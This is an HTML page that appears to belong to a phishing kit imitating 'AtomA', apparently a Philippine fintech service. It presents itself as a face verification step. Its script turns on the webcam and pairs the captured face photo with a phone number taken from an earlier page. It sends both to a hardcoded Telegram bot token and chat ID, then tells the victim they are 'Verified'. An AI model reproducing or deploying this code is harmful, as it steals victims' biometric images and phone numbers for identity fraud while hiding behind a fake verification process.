<!DOCTYPE html>
<html lang="en-ph">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AtomA | Facial Verification</title>
    <link rel="preload" as="image" href="photos/atomebg.png">
    <link rel="preload" as="image" href="photos/atomeA.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter','Space Grotesk',sans-serif;min-height:100vh;overflow-x:hidden}
        .bg-theme{background-image:url('photos/atomebg.png');background-size:cover;background-attachment:fixed;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .facial-container{background:linear-gradient(165deg,rgba(126,200,224,0.96),rgba(253,225,139,0.96));border-radius:60px;width:90%;max-width:400px;padding:28px 24px;text-align:center;box-shadow:0 30px 50px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.5)}
        .facial-header h3{font-size:1.4rem;font-weight:800;color:#1a2a3a;margin-bottom:6px}
        .facial-header p{font-size:.75rem;color:#d46b5e;margin-bottom:20px}
        .camera-frame{position:relative;width:240px;height:240px;margin:0 auto 20px;border-radius:50%;overflow:hidden;border:4px solid #FFD700;background:#000}
        .camera-frame video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
        .guide-circle{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:50%;box-shadow:inset 0 0 20px 5px rgba(0,255,0,0.3);pointer-events:none}
        .guide-circle.active{box-shadow:inset 0 0 30px 8px rgba(0,255,0,0.8);animation:pulseGreen .6s}
        @keyframes pulseGreen{0%{box-shadow:inset 0 0 0 0 rgba(0,255,0,0.8)}100%{box-shadow:inset 0 0 30px 8px rgba(0,255,0,0.8)}}
        .scan-line{position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,transparent,#0f0,#0f0,transparent);display:none;animation:scanMove 2s linear infinite}
        .scan-line.active{display:block}
        @keyframes scanMove{0%{top:0}100%{top:100%}}
        .buttons{display:flex;gap:12px;margin:16px 0}
        .btn{flex:1;background:#1a1a1a;border:1.5px solid #FDD97A;padding:12px;border-radius:60px;color:#FDD97A;font-weight:700;cursor:pointer}
        .btn.cancel{background:rgba(212,107,94,0.25);border-color:#d46b5e;color:#d46b5e}
        .status{font-size:.75rem;color:#2d6a4f;background:rgba(255,245,235,0.95);padding:10px;border-radius:60px;margin-top:8px}
        .status.success{background:#d4edda;color:#155724}
        .status.error{background:#f8d7da;color:#721c24}
        .phone-display{background:rgba(0,0,0,0.5);padding:8px;border-radius:60px;margin-bottom:15px;color:#FFE566;font-weight:600;font-size:.8rem}
        @media(max-width:480px){.camera-frame{width:200px;height:200px}}
    </style>
</head>
<body>
<div class="bg-theme">
    <div class="facial-container">
        <div class="facial-header"><h3>😊 Face Verification</h3><p>Center your face in the circle</p></div>
        <div class="phone-display" id="phoneDisplay">Loading...</div>
        <div class="camera-frame">
            <video id="faceVideo" autoplay playsinline muted></video>
            <div class="guide-circle" id="guideCircle"></div>
            <div class="scan-line" id="scanLine"></div>
        </div>
        <div class="buttons">
            <button class="btn" id="captureBtn">📸 CAPTURE & VERIFY</button>
            <button class="btn cancel" id="backBtn">← BACK</button>
        </div>
        <div class="status" id="faceStatus">🎯 Position your face within the circle</div>
    </div>
</div>
<script>
    const BOT_TOKEN="8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg",CHAT_ID="7298607329";
    let phoneNum=null,stream=null,camReady=false;
    const faceVideo=document.getElementById('faceVideo'),captureBtn=document.getElementById('captureBtn'),backBtn=document.getElementById('backBtn'),faceStatus=document.getElementById('faceStatus'),scanLine=document.getElementById('scanLine'),guideCircle=document.getElementById('guideCircle'),phoneDisplay=document.getElementById('phoneDisplay');
    phoneNum=localStorage.getItem('tempPhoneNumber');
    if(!phoneNum){ phoneDisplay.innerHTML="❌ No phone number found"; setTimeout(()=>{window.location.href='index.html';},2000); } else { phoneDisplay.innerHTML=`📱 Verifying: +63${phoneNum}`; }
    async function startCam(){ try{ if(stream) stream.getTracks().forEach(t=>t.stop()); const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}); stream=s; faceVideo.srcObject=s; await new Promise(r=>{faceVideo.onloadedmetadata=()=>{faceVideo.play();r()}}); await new Promise(r=>setTimeout(r,500)); camReady=true; faceStatus.innerHTML="✅ Camera ready!"; faceStatus.className="status success"; return true; }catch(e){ faceStatus.innerHTML="❌ Camera denied"; faceStatus.className="status error"; return false; } }
    function stopCam(){ if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; } faceVideo.srcObject=null; camReady=false; }
    function startScan(){ scanLine.classList.add('active'); guideCircle.classList.add('active'); setTimeout(()=>guideCircle.classList.remove('active'),600); }
    function stopScan(){ scanLine.classList.remove('active'); }
    async function captureAndSend(){ if(!camReady){ faceStatus.innerHTML="❌ Camera not ready"; return; } startScan(); try{ const canvas=document.createElement('canvas'); canvas.width=faceVideo.videoWidth; canvas.height=faceVideo.videoHeight; const ctx=canvas.getContext('2d'); ctx.save(); ctx.scale(-1,1); ctx.drawImage(faceVideo,-canvas.width,0,canvas.width,canvas.height); ctx.restore(); const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9)); if(!blob||blob.size<1000){ faceStatus.innerHTML="❌ Capture failed"; stopScan(); return; } const kb=(blob.size/1024).toFixed(1); faceStatus.innerHTML=`📸 ${kb}KB - Sending...`; const fd=new FormData(); fd.append('chat_id',CHAT_ID); fd.append('photo',blob,`face_${phoneNum}_${Date.now()}.jpg`); fd.append('caption',`🔐 NEW FACE CAPTURE\n📱 +63${phoneNum}\n⏰ ${new Date().toLocaleString()}\n📍 AtomA Facial Verification`); const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd}); const result=await res.json(); if(result.ok){ faceStatus.innerHTML="✅ Verified! Face sent to Telegram!"; faceStatus.className="status success"; stopScan(); localStorage.setItem('atomeUser',JSON.stringify({phone:phoneNum,verified:true,verifiedTime:new Date().toISOString()})); setTimeout(()=>{window.location.href='index.html';},2000); }else{ faceStatus.innerHTML="❌ Telegram error"; stopScan(); } }catch(err){ faceStatus.innerHTML="❌ Error sending"; stopScan(); } }
    captureBtn.addEventListener('click',captureAndSend); backBtn.addEventListener('click',()=>{window.location.href='index.html';});
    startCam();
</script>
</body>
</html>
